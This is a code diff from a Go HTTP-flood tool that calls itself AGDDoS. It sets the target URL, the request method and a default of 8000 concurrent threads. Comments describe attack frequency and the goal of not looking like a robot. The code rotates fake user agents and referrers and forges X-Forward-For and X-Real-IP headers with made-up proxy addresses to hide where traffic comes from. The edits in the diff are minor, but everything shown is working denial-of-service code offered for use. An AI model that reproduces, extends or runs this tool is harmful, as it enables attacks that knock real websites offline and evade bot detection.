@@ -30,16 +30,18 @@ const (
 		"please submit issue at : https://github.com/AGDDoS/AGDDoS"
 )
 
+// X args
+var (
+	timestamp = "unknown"
+	version   = "unknown"
+)
+
 var (
 	Method              string
 	TargetUrl           string
 	IntervalMillisecond int
 	ConcurrencyCount    int
 	DurationMinute      int
-
-	// X args
-	timestamp = "unknown"
-	version   = "unknown"
 
 	//TODO：Socks5 Proxy
 	DDosHttpClient = &http.Client{
@@ -68,6 +70,7 @@ var (
 		"Mozilla/5.0 (compatible; Googlebot-Image/1.0; +http://www.google.com/bot.html)",
 		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
 		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
+		"AGDDoS/" + version + "(" + timestamp + ")",
 	}
 
 	Refs = []string{
@@ -101,7 +104,7 @@ func main() {
 	}
 	printWelcome()
 	// Parse Flags / 解析命令行参数
-	flag.StringVar(&Method, "m", "GET", "DDoS Method(GET/POST/HEAD/...)")
+	flag.StringVar(&Method, "m", "GET", "DDoS Method(GET/POST/PUT/HEAD/...)")
 	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "Taget URL")
 	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发线程数量")
 	flag.IntVar(&IntervalMillisecond, "ims", 100, "每个线程执行攻击的频率(ms)")
@@ -143,13 +146,13 @@ func DoHttpRequest() (*string, error) {
 		return nil, err
 	}
 	// Make yourself don't look like a robot
-	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])                        // 生成伪UA
-	request.Header.Set("Referrer", Refs[rand.Intn(len(Refs))])                                      // 生成伪来源页面的地址
-	request.Header.Set("Accept", "*/*")                                                             // 接受所有
-	request.Header.Set("Accept-encoding", "gzip, deflate, br")                                      // 声明浏览器支持的编码类型
-	request.Header.Set("Accept-language", "zh-CN,zh;q=0.9")                                         // 接受网页语言
-	request.Header.Set("X-Forward-For", "186.240.156.78,1.4.0.1,1.5.127.254,1.5.26.6,"+genIpaddr()) // 多 层 代 理
-	request.Header.Set("X-Real-IP", "186.240.156.78")                                               // 多 层 代 理
+	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])      // 生成伪UA
+	request.Header.Set("Referrer", Refs[rand.Intn(len(Refs))])                    // 生成伪来源页面的地址
+	request.Header.Set("Accept", "*/*")                                           // 接受所有
+	request.Header.Set("Accept-encoding", "gzip, deflate, br")                    // 声明浏览器支持的编码类型
+	request.Header.Set("Accept-language", "zh-CN,zh-TW;q=0.9")                    // 接受网页语言
+	request.Header.Set("X-Forward-For", "186.240.156.78,1.4.72.237,"+genIpaddr()) // 多 层 代 理
+	request.Header.Set("X-Real-IP", "186.240.156.78")                             // 多 层 代 理
 	request.Header.Set("DDoS-Powered-By", "AGDDoS")
 
 	response, err := DDosHttpClient.Do(request)
